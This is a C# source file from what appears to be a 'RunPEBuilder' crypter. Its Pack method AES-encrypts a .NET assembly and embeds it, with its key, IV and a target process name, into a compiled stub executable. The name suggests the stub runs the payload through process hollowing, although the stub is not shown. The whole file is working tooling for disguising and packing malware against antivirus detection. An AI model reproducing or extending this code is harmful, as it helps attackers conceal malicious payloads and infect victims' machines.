using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using Microsoft.CSharp;

namespace RunPEBuilder.Include
{
    internal class PckMethod
    {
        public enum DotNetVersion
        {
            v2_0,
            v3_5,
            v4_0
        }

        public static byte[] Pack(byte[] assembly, string processName, DotNetVersion version)
        {
            try
            {
                // Initialize AES encryption
                using (AesManaged aes = new AesManaged
                {
                    KeySize = 256,
                    Padding = PaddingMode.ISO10126
                })
                {
                    aes.GenerateIV();
                    aes.GenerateKey();

                    string key = Convert.ToBase64String(aes.Key);
                    string iv = Convert.ToBase64String(aes.IV);
                    string app;

                    // Encrypt the assembly
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(assembly, 0, assembly.Length);
                            cryptoStream.FlushFinalBlock();
                            app = Convert.ToBase64String(memoryStream.ToArray());
                        }
                    }

                    // Prepare the stub code
                    string csharpcode = Properties.Resources.stub
                        .Replace("%KEY%", key)
                        .Replace("%IV%", iv)
                        .Replace("%PROGRAM%", app)
                        .Replace("%PROCESS_NAME%", processName);

                    Assembly orig = Assembly.Load(assembly);

                    var providerOptions = new Dictionary<string, string>
                    {
                        { "CompilerVersion", version == DotNetVersion.v4_0 ? "v4.0" : version == DotNetVersion.v3_5 ? "v3.5" : "v2_0" }
                    };

                    using (CSharpCodeProvider codeProvider = new CSharpCodeProvider(providerOptions))
                    {
                        CompilerParameters parameters = new CompilerParameters
                        {
                            CompilerOptions = "/target:winexe",
                            GenerateExecutable = true,
                            OutputAssembly = Path.GetTempPath() + Guid.NewGuid() + ".exe"
                        };

                        parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                        parameters.ReferencedAssemblies.Add("System.dll");
                        parameters.ReferencedAssemblies.Add("System.Core.dll");

                        foreach (AssemblyName name in orig.GetReferencedAssemblies())
                        {
                            if (name.Name.Contains("System.") || name.Name.Contains("Microsoft."))
                                parameters.ReferencedAssemblies.Add(name.Name + ".dll");
                        }

                        // Compile the stub
                        CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, csharpcode);

                        if (results.Errors.HasErrors)
                        {
                            foreach (CompilerError error in results.Errors)
                            {
                                Console.WriteLine($"Error ({error.ErrorNumber}): {error.ErrorText}");
                            }
                            return null;
                        }

                        // Read the compiled assembly
                        using (FileStream fs = new FileStream(results.PathToAssembly, FileMode.Open, FileAccess.Read))
                        {
                            byte[] barr = new byte[fs.Length];
                            fs.Read(barr, 0, barr.Length);
                            return barr;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Exception in Pack method: {ex.Message}\nStack Trace:\n{ex.StackTrace}");
                return null;
            }
        }
    }
}
